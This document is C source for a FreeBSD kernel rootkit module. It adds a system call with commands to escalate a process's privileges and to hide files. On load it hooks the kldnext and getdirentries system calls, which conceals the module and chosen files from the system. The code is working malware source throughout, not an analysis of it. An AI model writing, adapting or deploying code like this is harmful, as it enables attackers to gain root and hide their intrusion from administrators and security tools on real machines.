#include "rootkit.h"

struct node * first_node = NULL;

/* The system call's arguments. */
struct rootkit_args {
	int command;
	char ** args;
};

static int testfd = 0;
//Following fd functions taken from https://lists.freebsd.org/pipermail/freebsd-hackers/2007-May/020625.html

static int
filewriter_closelog(struct thread *td, int fd)
{
  printf("filewriter_closelog fd: %d\n", fd);
  if(fd)
  {
    struct close_args fdtmp;
    fdtmp.fd = fd;
    printf("filewriter_closelog thread ptr: %x\n", (unsigned int)td);
    return sys_close(td, &fdtmp);
  }
  return 0;
}

static int
filewriter_openlog(struct thread *td, int *fd, char *path)
{
  int error;
  error = kern_openat(td, AT_FDCWD, path, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
  if (!error)
  {
    *fd = td->td_retval[0];
    printf("openlog fd: %d\n", *fd);
  }
  else
    printf("openlog failed\n");
  return error;
}

static int
filewriter_writelog(struct thread *td, int fd, char *line, u_int len)
{
  struct uio auio;
  struct iovec aiov;
  int err;

  bzero(&aiov, sizeof(aiov));
  bzero(&auio, sizeof(auio));
  
  aiov.iov_base = line;
  aiov.iov_len = len;
  
  auio.uio_iov = &aiov;
  auio.uio_offset = 0;
  auio.uio_segflg = UIO_SYSSPACE;
  auio.uio_rw = UIO_WRITE;
  auio.uio_iovcnt = 1;
  auio.uio_resid = len;

  auio.uio_td = td;

  printf("fd: %u\n", fd);
  //printf(aiov.iov_base);
  err = kern_writev(td, fd, &auio);
  printf("write err: %u\n", err);

  return err;
}


/* The system call function. */
static int main(struct thread *td, void *syscall_args) {

	struct rootkit_args *uap;
	uap = (struct rootkit_args *)syscall_args;

	long resp;

	switch(uap->command){
		case 0:// Unload
			break;
		case 1:// Escalate
			elevate(td);
			break;
		case 2:// File hide
			add_file(uap->args[0]);
			break;
		case 3:
			remove_file(uap->args[0]);
			break;
		case 4:
			resp = strtol(uap->args[1], NULL, 10);
			set_flag_bits(uap->args[0], (uint8_t)resp);
			break;
		case 5:
			resp = strtol(uap->args[1], NULL, 10);
			unset_flag_bits(uap->args[0], (uint8_t)resp);
			break;
		default:
			uprintf("Bad command\n");
			break;
	}

	return(0);
}

/* The sysent for the new system call. */
static struct sysent rootkit_sysent = {
	2,			/* number of arguments */
	main		/* implementing function */
};

/* The offset in sysent[] where the system call is to be allocated. */
static int offset = NO_SYSCALL;

/* The function called at load/unload. */
static int load(struct module *module, int cmd, void *arg) {
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext_hook;
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries_hook;

		char buf[256] = {0};
		snprintf(buf,256,"%d",offset);

		filewriter_openlog(curthread, &testfd, "useful.txt");
		filewriter_writelog(curthread, testfd, buf, strlen(buf));
		filewriter_closelog(curthread, testfd);
		break;

	case MOD_UNLOAD:
		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;

		break;

	default:
		error = EOPNOTSUPP;
		break;
	}

	return(error);
}

static struct syscall_module_data rootkit_func_mod = {
	load, NULL, &offset, &rootkit_sysent, { 0, NULL }
};

static moduledata_t rootkit_mod = {
	MODULE_NAME,
	syscall_module_handler,
	&rootkit_func_mod
};

DECLARE_MODULE(rootkit, rootkit_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);

